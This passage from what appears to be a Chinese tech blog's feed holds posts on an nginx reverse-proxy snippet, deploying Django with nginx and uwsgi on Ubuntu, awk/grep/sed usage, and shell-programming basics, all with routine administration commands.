<h3 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h3><p>这里顺便记录一下，用nginx配置反向代理的方法，这种方法也被大量用在网页劫持（黑产）中，这里不详细介绍了。</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>将以下内容添加到nginx配置文件的server中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location /update/&#123;<span class="comment">#将本地update目录代理到baidu.com/update目录下，即访问本地update其实是在访问baidu的update。</span></div><div class="line">        proxy_pass         http://baidu.com/update; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重启nginx，尝试访问<em><a href="http://phantomjs.me/update/" target="_blank" rel="external">http://phantomjs.me/update/</a></em>，其实际获取的是baidu的update目录资源。</p>
<p>关于nginx负载均衡更详细的内容，可以访问：<a href="http://www.jusene.me/2017/05/24/nginx-proxy/" target="_blank" rel="external">http://www.jusene.me/2017/05/24/nginx-proxy/</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.jianshu.com/p/ac8956f79206" target="_blank" rel="external">http://www.jianshu.com/p/ac8956f79206</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Give more than you planned to&lt;br&gt;多多给予，不必计较&lt;/blockquote&gt;&lt;br&gt;　　nginx功能强大且常用作反向代理或者负载均衡，当我们部署了一个web系统之后，面对日益增多的访问流量，采用nginx做负载均衡是一个实惠的方案，本文用来记录nginx实现负载均衡的一些操作。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>nginx+uwsgi部署Django</title>
    <link href="http://thief.one/2017/08/21/1/"/>
    <id>http://thief.one/2017/08/21/1/</id>
    <published>2017-08-21T12:31:59.000Z</published>
    <updated>2017-09-01T12:56:23.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Constant dropping wears the stone<br>滴水穿石</blockquote><br>　　本文用来记录Django部署的一些笔记，文中描述的系统环境为Ubuntu，采用的服务器为nginx以及用uwsgi来连接Django，这也是目前Django比较主流的部署套餐。<br><a id="more"></a></p>
<h3 id="部署连接原理"><a href="#部署连接原理" class="headerlink" title="部署连接原理"></a>部署连接原理</h3><p>浏览器发起web请求&lt;——&gt;nginx接收请求&lt;——&gt;uwsgi处理请求&lt;—–&gt;django程序</p>
<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>安装nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nginx</div></pre></td></tr></table></figure></p>
<p>运行并查看状态<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div><div class="line">/etc/init.d/nginx status</div></pre></td></tr></table></figure></p>
<h4 id="Uwsgi"><a href="#Uwsgi" class="headerlink" title="Uwsgi"></a>Uwsgi</h4><p>先安装python-dev，否则uwsgi安装可能会报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python-dev</div></pre></td></tr></table></figure></p>
<p>安装uwsgi<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install uwsgi</div></pre></td></tr></table></figure></p>
<p>安装完后添加环境变量:<br>打开文件：sudo vim .bashrc，添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=/home/nmask/.<span class="built_in">local</span>/bin/:<span class="variable">$PATH</span></div></pre></td></tr></table></figure></p>
<p>然后运行source .bashrc使之生效，就可以在命令行直接运行uwsgi</p>
<h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><h4 id="测试nginx"><a href="#测试nginx" class="headerlink" title="测试nginx"></a>测试nginx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div></pre></td></tr></table></figure>
<p>打开<em><a href="http://localhost:80" target="_blank" rel="external">http://localhost:80</a></em>，能看到nginx说明nginx安装成功。</p>
<h4 id="测试uwsgi"><a href="#测试uwsgi" class="headerlink" title="测试uwsgi"></a>测试uwsgi</h4><p>项目根目录下创建test.py文件，写入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def application(env, start_response):</div><div class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>,<span class="string">'text/html'</span>)])</div><div class="line">    <span class="built_in">return</span> <span class="string">"Hello World”</span></div></pre></td></tr></table></figure></p>
<p>项目根目录下运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --http :8001 --wsgi-file test.py</div></pre></td></tr></table></figure></p>
<p>访问<em><a href="http://localhost:8001" target="_blank" rel="external">http://localhost:8001</a></em>，如果能看到hello world，说明uwsgi安装成功。</p>
<h5 id="利用uwsgi运行django项目"><a href="#利用uwsgi运行django项目" class="headerlink" title="利用uwsgi运行django项目"></a>利用uwsgi运行django项目</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --http :8001 --<span class="built_in">chdir</span> /home/nmask/mydjango --wsgi-file mydjango/wsgi.py --master --processes 4 --threads 2 --stats 127.0.0.1:8080</div></pre></td></tr></table></figure>
<p>常用选项：</p>
<ul>
<li>http ： 协议类型和端口号</li>
<li>processes ： 开启的进程数量</li>
<li>workers ： 开启的进程数量，等同于processes（官网的说法是spawn the specified number ofworkers / processes）</li>
<li>chdir ： 指定运行目录（chdir to specified directory before apps loading）</li>
<li>wsgi-file ： 载入wsgi-file（load .wsgi file）</li>
<li>stats ： 在指定的地址上，开启状态服务（enable the stats server on the specified address）</li>
<li>threads ： 运行线程。由于GIL的存在，我觉得这个真心没啥用。（run each worker in prethreaded mode with the specified number of threads）</li>
<li>master ： 允许主进程存在（enable master process）</li>
<li>daemonize ： 使进程在后台运行，并将日志打到指定的日志文件或者udp服务器（daemonize uWSGI）。实际上最常用的，还是把运行记录输出到一个本地文件上。</li>
<li>pidfile ： 指定pid文件的位置，记录主进程的pid号。</li>
<li>vacuum ： 当服务器退出的时候自动清理环境，删除unix socket文件和pid文件（try to remove all of the generated file/sockets）</li>
</ul>
<h3 id="文件配置"><a href="#文件配置" class="headerlink" title="文件配置"></a>文件配置</h3><h4 id="myweb-uwsgi-ini"><a href="#myweb-uwsgi-ini" class="headerlink" title="myweb_uwsgi.ini"></a>myweb_uwsgi.ini</h4><p>项目根目录下创建：myweb_uwsgi.ini文件，写入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># myweb_uwsgi.ini file</span></div><div class="line">[uwsgi]</div><div class="line"></div><div class="line"><span class="comment"># Django-related settings</span></div><div class="line"></div><div class="line">socket = :8000</div><div class="line"></div><div class="line"><span class="comment"># the base directory (full path)</span></div><div class="line"><span class="built_in">chdir</span>           = /home/nmask/mydjango</div><div class="line"><span class="comment"># Django s wsgi file</span></div><div class="line">module          = mydjango.wsgi</div><div class="line"></div><div class="line"><span class="comment"># process-related settings</span></div><div class="line"><span class="comment"># master</span></div><div class="line">master          = <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="comment"># maximum number of worker processes</span></div><div class="line">processes       = 4</div><div class="line"></div><div class="line"><span class="comment"># ... with appropriate permissions - may be needed</span></div><div class="line"><span class="comment"># chmod-socket    = 664</span></div><div class="line"><span class="comment"># clear environment on exit</span></div><div class="line">vacuum          = <span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>利用uwsgi运行django：（与前面命令行的方式一样，这样为了方便写成了文件）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --ini myweb_uwsgi.ini</div></pre></td></tr></table></figure></p>
<p>配置文件参数：</p>
<ul>
<li>socket:指uwsgi运行的端口</li>
<li>Chdir:运行的目录</li>
<li>Module：运行的文件</li>
</ul>
<h4 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h4><p>打开/etc/nginx/nginx.conf，http内添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen         8890; </div><div class="line">    server_name    127.0.0.1 </div><div class="line">    charset UTF-8;</div><div class="line">    access_log      /var/<span class="built_in">log</span>/nginx/myweb_access.log;</div><div class="line">    error_log       /var/<span class="built_in">log</span>/nginx/myweb_error.log;</div><div class="line"></div><div class="line">    client_max_body_size 75M;</div><div class="line"></div><div class="line">    location / &#123; </div><div class="line">        include uwsgi_params;</div><div class="line">        uwsgi_pass 127.0.0.1:8000;</div><div class="line">        uwsgi_read_timeout 2;</div><div class="line">    &#125;   </div><div class="line">    location /static &#123;</div><div class="line">        expires 30d;</div><div class="line">        autoindex on; </div><div class="line">        add_header Cache-Control private;</div><div class="line">        <span class="built_in">alias</span> /home/fnngj/pydj/myweb/static/;</div><div class="line">     &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>说明：这里的8000端口是uwsgi的端口，nginx运行将开启8890端口，也就是nginx的8890端口与uwsgi的8000端口相互通信。</p>
<h3 id="部署运行"><a href="#部署运行" class="headerlink" title="部署运行"></a>部署运行</h3><p>运行uwsgi：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nohup uwsgi --ini myweb_uwsgi.ini &amp;</div></pre></td></tr></table></figure></p>
<p>运行nginx:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div></pre></td></tr></table></figure></p>
<p>最后访问<em><a href="http://localhost:8890" target="_blank" rel="external">http://localhost:8890</a></em>，可以看到django项目已经被运行在nginx上了。</p>
<p>注意：<em>在更新Django代码后，最好重启一下uwsgi进程，避免出现不可预知的Bug！</em></p>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><ul>
<li>如果服务器是映射的，nginx配置文件里面的server_name要写外网的IP或者域名</li>
<li>不要在python虚拟环境中使用uwsgi，会有一些问题，当然也可以解决，参考：<a href="https://stackoverflow.com/questions/14194859/importerror-no-module-named-django-core-wsgi-for-uwsgi" target="_blank" rel="external">https://stackoverflow.com/questions/14194859/importerror-no-module-named-django-core-wsgi-for-uwsgi</a></li>
</ul>
<h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><h4 id="No-module-named-django-core-wsgi"><a href="#No-module-named-django-core-wsgi" class="headerlink" title="No module named django.core.wsgi"></a>No module named django.core.wsgi</h4><p>启动uwsgi时报以下错误：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ImportError: No module named django.core.wsgi <span class="keyword">for</span> uwsgi</div></pre></td></tr></table></figure></p>
<p>uwsgi在python虚拟环境中启动时，配置文件里面要加虚拟的路径。<br>打开django.init（自己创建）写入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">home=/path/to/venv/</div></pre></td></tr></table></figure></p>
<p>运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uwsgi --ini django.ini --protocol=http</div></pre></td></tr></table></figure></p>
<h4 id="uwsgi-http-is-ambiguous"><a href="#uwsgi-http-is-ambiguous" class="headerlink" title="uwsgi http is ambiguous"></a>uwsgi http is ambiguous</h4><p>这也是因为虚拟环境的原因，建议退出python的虚拟环境，然后pip install uwsgi。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.cnblogs.com/fnng/p/5268633.html" target="_blank" rel="external">http://www.cnblogs.com/fnng/p/5268633.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Constant dropping wears the stone&lt;br&gt;滴水穿石&lt;/blockquote&gt;&lt;br&gt;　　本文用来记录Django部署的一些笔记，文中描述的系统环境为Ubuntu，采用的服务器为nginx以及用uwsgi来连接Django，这也是目前Django比较主流的部署套餐。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="nginx" scheme="http://thief.one/tags/nginx/"/>
    
      <category term="Django" scheme="http://thief.one/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】awk、grep、sed</title>
    <link href="http://thief.one/2017/08/12/1/"/>
    <id>http://thief.one/2017/08/12/1/</id>
    <published>2017-08-12T02:41:19.000Z</published>
    <updated>2017-09-01T11:25:37.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Learn and live<br>活着，为了学习<br></blockquote><br>　　awk、grep、sed是linux操作文本的三大利器，也是必须掌握的linux命令之一。三者的功能都是处理文本，但侧重点各不相同，其中属awk功能最强大，但也最复杂。grep更适合单纯的查找或匹配文本，sed更适合编辑匹配到的文本，awk更适合格式化文本，对文本进行较复杂格式处理。<br><a id="more"></a><br>以下所有实验输出，均以测试文件test.log内容为基准：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">20170102 admin,password Open</div><div class="line">20170801 nmask,nmask close</div><div class="line">20180902 nm4k,<span class="built_in">test</span> filter</div></pre></td></tr></table></figure></p>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>AWK是一种处理文本文件的语言，是一个强大的文本分析工具;awk是以列为划分计数的，$0表示所有列，$1表示第一列，$2表示第二列。</p>
<h4 id="awk参数"><a href="#awk参数" class="headerlink" title="awk参数"></a>awk参数</h4><ul>
<li>-F 指定输入文件折分隔符，如-F:</li>
<li>-v 赋值一个用户定义变量，如-va=1</li>
<li>-f 从脚本文件中读取awk命令</li>
</ul>
<p>注：只列举最常用的参数</p>
<h4 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h4><p>每行按空格分割列，并输出第1、4列<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ awk <span class="string">'&#123;print $1,$4&#125;'</span> test.log</div><div class="line">或者</div><div class="line">$ cat test.log | awk <span class="string">'&#123;print $1,$4&#125;'</span></div></pre></td></tr></table></figure></p>
<h4 id="自定义分隔符"><a href="#自定义分隔符" class="headerlink" title="自定义分隔符"></a>自定义分隔符</h4><p>使用”,”进行分割，参数用-F<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk -F, <span class="string">'&#123;print $1,$2&#125;'</span> test.log</div></pre></td></tr></table></figure></p>
<p>使用多个分隔符，先使用空格分割，然后对分割结果再使用”,”分割<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ awk -F <span class="string">'[ ,]'</span>  <span class="string">'&#123;print $1,$2,$3&#125;'</span>  test.log  <span class="comment">#注意逗号前面有一个空格</span></div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170812/1.png" alt=""></p>
<h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><p>设置awk自定义变量，用参数-v<br>例子：设置变量a为1<br><img src="/upload_image/20170812/2.png" alt=""><br>注意：-v a之间要空格。</p>
<p>字符串拼接：（用””而不是+）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat test.txt | awk -v a=\<span class="string">" '&#123;print a"</span><span class="string">"<span class="variable">$0</span>"</span><span class="string">"a&#125;'</span></div></pre></td></tr></table></figure></p>
<h4 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h4><p>输出第一列为20170801的记录<br><img src="/upload_image/20170812/3.png" alt=""></p>
<p>输出第二列不是nmask,nmask的记录<br><img src="/upload_image/20170812/4.png" alt=""></p>
<h4 id="内建变量"><a href="#内建变量" class="headerlink" title="内建变量"></a>内建变量</h4><p>NR参数：输出行号<br><img src="/upload_image/20170812/5.png" alt=""></p>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>输出第二列中包含nm开头的所有记录<br><img src="/upload_image/20170812/6.png" alt=""><br>输出包含2017开头的记录<br><img src="/upload_image/20170812/7.png" alt=""><br>注意：这里没有～，因为没有指定是哪一列</p>
<p>忽略大小写{INGORECASE=1}<br><img src="/upload_image/20170812/8.png" alt=""><br>匹配取反 !~<br><img src="/upload_image/20170812/9.png" alt=""></p>
<h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><h5 id="substr字符串截取"><a href="#substr字符串截取" class="headerlink" title="substr字符串截取"></a>substr字符串截取</h5><p>截取第一列的第一到第四个字符<br><img src="/upload_image/20170812/10.png" alt=""></p>
<h5 id="split切分字符串"><a href="#split切分字符串" class="headerlink" title="split切分字符串"></a>split切分字符串</h5><p>以逗号分隔第2列的数据，并输出分别输出第2列的内容<br><img src="/upload_image/20170812/11.png" alt=""></p>
<h5 id="gsub替换"><a href="#gsub替换" class="headerlink" title="gsub替换"></a>gsub替换</h5><p>将第2列中的nmask替换成nMask<br><img src="/upload_image/20170812/12.png" alt=""></p>
<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>Linux grep命令用于查找文件里符合条件的字符串。</p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>递归查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -r nmask /etc/  <span class="comment">#查看/etc目录下内容包含nmask的文件</span></div></pre></td></tr></table></figure></p>
<p>查询取反<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -v <span class="built_in">test</span>  test.log</div></pre></td></tr></table></figure></p>
<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>Linux sed命令是利用script来处理文本文件。</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>-e 以选项中指定的script来处理输入的文本文件。<br>-f 以选项中指定的script文件来处理输入的文本文件。<br>-h 显示帮助。<br>-n 仅显示script处理后的结果。<br>-V 显示版本信息。</p>
<h4 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h4><p>a ：新增， a 的后面可以接字串，而这些字串会在下一行出现<br>i ：插入， i 的后面可以接字串，而这些字串会在上一行出现<br>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行<br>d ：删除<br>s ：取代，通常这个s的动作可以搭配正规表示法！如 s/old/new/g</p>
<h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><p>在test.log文件的第4行后插入一行，内容为nmask<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -e 4a\nmask test.log</div></pre></td></tr></table></figure></p>
<h4 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h4><p>删除test.log的第2行、第3行数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat test.log | sed <span class="string">'2,3d'</span></div></pre></td></tr></table></figure></p>
<p>匹配删除，删除行中有nmask字符串的<br><img src="/upload_image/20170812/13.png" alt=""></p>
<h4 id="替换操作"><a href="#替换操作" class="headerlink" title="替换操作"></a>替换操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed <span class="string">'s/要被取代的字串/新的字串/g'</span></div></pre></td></tr></table></figure>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="external">http://www.runoob.com/linux/linux-comm-awk.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Learn and live&lt;br&gt;活着，为了学习&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　awk、grep、sed是linux操作文本的三大利器，也是必须掌握的linux命令之一。三者的功能都是处理文本，但侧重点各不相同，其中属awk功能最强大，但也最复杂。grep更适合单纯的查找或匹配文本，sed更适合编辑匹配到的文本，awk更适合格式化文本，对文本进行较复杂格式处理。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】shell编程</title>
    <link href="http://thief.one/2017/08/11/1/"/>
    <id>http://thief.one/2017/08/11/1/</id>
    <published>2017-08-11T08:38:23.000Z</published>
    <updated>2017-08-31T07:21:26.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我猜你可能会问我为什么最近更新得这么勤？<br>因为我在充电！<br></blockquote><br>　　如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。<br><a id="more"></a></p>
<h3 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h3><h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><p>普通变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"123"</span></div><div class="line">b=<span class="string">"test"</span></div></pre></td></tr></table></figure></p>
<p>只读变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"123"</span></div><div class="line"><span class="built_in">readonly</span> a</div></pre></td></tr></table></figure></p>
<p>顾名思义，只读变量不能改变内容，否则会报如下错误<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh: NAME: This variable is <span class="built_in">read</span> only.</div></pre></td></tr></table></figure></p>
<h4 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> &#123;<span class="variable">$a</span>&#125; 或者 <span class="built_in">echo</span> <span class="variable">$a</span></div><div class="line">c=<span class="variable">$a</span></div></pre></td></tr></table></figure>
<p>只有在使用变量时，变量名前需要加$符号,{}可选当然最好使用。</p>
<h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">unset</span> a   <span class="comment"># 不能删除只读变量</span></div></pre></td></tr></table></figure>
<h3 id="shell数据结构"><a href="#shell数据结构" class="headerlink" title="shell数据结构"></a>shell数据结构</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">str=<span class="string">"123"</span></div><div class="line">str=<span class="string">'123'</span></div></pre></td></tr></table></figure>
<ul>
<li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的</li>
<li>单引号字串中不能出现单引号（对单引号使用转义符后也不行）</li>
<li>双引号里可以有变量</li>
<li>双引号里可以出现转义字符</li>
</ul>
<h5 id="字符串与字符串变量的拼接"><a href="#字符串与字符串变量的拼接" class="headerlink" title="字符串与字符串变量的拼接"></a>字符串与字符串变量的拼接</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Str_new=<span class="string">"this is "</span><span class="variable">$str</span><span class="string">""</span></div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Str _new=<span class="string">"this is &#123;<span class="variable">$str</span>&#125;"</span></div></pre></td></tr></table></figure></p>
<h5 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=<span class="string">"abcd"</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span> <span class="comment">#输出4</span></div></pre></td></tr></table></figure>
<h5 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=<span class="string">"this is a test"</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># 输出test</span></div></pre></td></tr></table></figure>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p>
<h5 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=(1 2 3 4)   <span class="comment"># 注意是空格隔开而不是逗号</span></div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a[0]=1</div><div class="line">a[1]=2</div><div class="line">a[2]=3</div><div class="line">a[3]=4</div></pre></td></tr></table></figure></p>
<h5 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">valuen=<span class="variable">$&#123;array_name[n]&#125;</span> <span class="comment"># 读取指定下标的元素</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array_name[@]&#125;</span>  <span class="comment"># 读取所有元素</span></div></pre></td></tr></table></figure>
<h5 id="数组的长度"><a href="#数组的长度" class="headerlink" title="数组的长度"></a>数组的长度</h5><p>取得数组元素的个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">length=<span class="variable">$&#123;#array_name[@]&#125;</span></div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">length=<span class="variable">$&#123;#array_name[*]&#125;</span></div></pre></td></tr></table></figure></p>
<p>取得数组单个元素的长度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lengthn=<span class="variable">$&#123;#array_name[n]&#125;</span></div></pre></td></tr></table></figure></p>
